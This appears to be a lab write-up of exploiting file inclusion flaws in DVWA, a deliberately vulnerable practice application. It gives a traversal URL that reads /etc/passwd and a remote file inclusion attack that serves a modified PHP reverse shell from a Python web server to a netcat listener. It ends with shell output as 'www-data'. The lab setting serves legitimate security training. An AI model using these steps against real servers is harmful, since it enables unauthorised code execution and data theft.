# Local File Inclusion(LFI)/Remote File Inclusion(RFI)

## Objective:
The purpose of this project is to gain practical experience in identifying and exploiting Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities within web applications. By setting up Damn Vulnerable Web Application (DVWA) on Virtualbox and using Docker, I aim to create a controlled environment for hands-on exploration. Key tasks and learning objectives include:

**Project Highlights:**

1. Environment Setup:
- Utilize Virtualbox to set up Damn Vulnerable Web Application (DVWA) and Docker on a Kali Linux machine.
- Establish a secure testbed to simulate real-world scenarios for LFI and RFI exploitation.
- Security Level Configuration:
- Configure DVWA security levels to low, medium, and high to simulate different complexities of LFI and RFI vulnerabilities.

2. Local File Inclusion (LFI) Exploration:
- Familiarize myself with the DVWA interface and locate sections related to LFI vulnerabilities.
- Exploit LFI by including local files, starting with the lowest security level and progressing to higher levels.
- Retrieve sensitive information, such as /etc/passwd, and document the steps taken and files accessed at each security level.

3. Remote File Inclusion (RFI) Exploration:
- Repeat the process for RFI vulnerabilities, attempting to include remote files and execute code from a Kali Linux machine.
- Start a Python server on Kali for RFI exploitation, demonstrating the inclusion of remote files and code execution on the target DVWA machine.
- Document the steps taken and files accessed during RFI exploitation at each security level.

4. Issue Resolution:
- Address common issues encountered during exploitation, including enabling the PHP function allow_url_include.
- Provide troubleshooting steps for resolving errors and challenges in the scanning environment.

## Walkthrough
### Local File Inclusion (LFI)

1. Docker Setup:

- Executed the command sudo docker run –rm -it -p 80:80 vulnerables/web-dvwa to launch the DVWA container.

2. Accessing DVWA:

- Opened DVWA on Firefox via http://localhost and logged in with admin credentials (Username: admin, Password: password).

3. Setting Security Level:

- Navigated to the DVWA Security tab and set the security level to low.

4. Exploiting LFI - Low Security Level:

- Moved to the "File Inclusion" tab and attempted to exploit the vulnerability by including local files.
- Altered the URL to http://localhost/vulnerabilities/fi/?page=../etc/passwd for directory traversal.
- Explored further with additional "../" to retrieve sensitive information.

5. Adjusting Security Level and Repeating LFI:

- Returned to the "DVWA Security" tab and increased the security level to medium.
- Moved to the "File Inclusion" tab to repeat the LFI process at the medium security level.

### Remote File Inclusion (RFI)

1. Setting Up RFI - Low Security Level:

- Returned to the "DVWA Security" page and set the security level to low.
- Accessed the "/usr/share/webshells/php" directory and modified the reverse shell PHP file using the command nano reverse-reverse-shell.php.
- Updated IP to "10.0.2.6" and port to "4445," saving the new file as "RFI1.php."

2. Initiating Listener and Python Server:

- Opened a new Kali tab and initiated a listener with the command nc -lvp 4445.
- Started a Python server on port 8000 in the "/webshells/php" directory using python3 -m http.server 8000.

3. Exploiting RFI:

- Modified the DVWA file inclusion URL to localhost/vulnerabilities/fi/?page=http://10.0.2.6:8000/RFI1.php.
- Observed successful execution in the netcat tab with the output "www-data" from the command whoami.
- Checked the Python server for the file execution timestamp and a 200-success code.
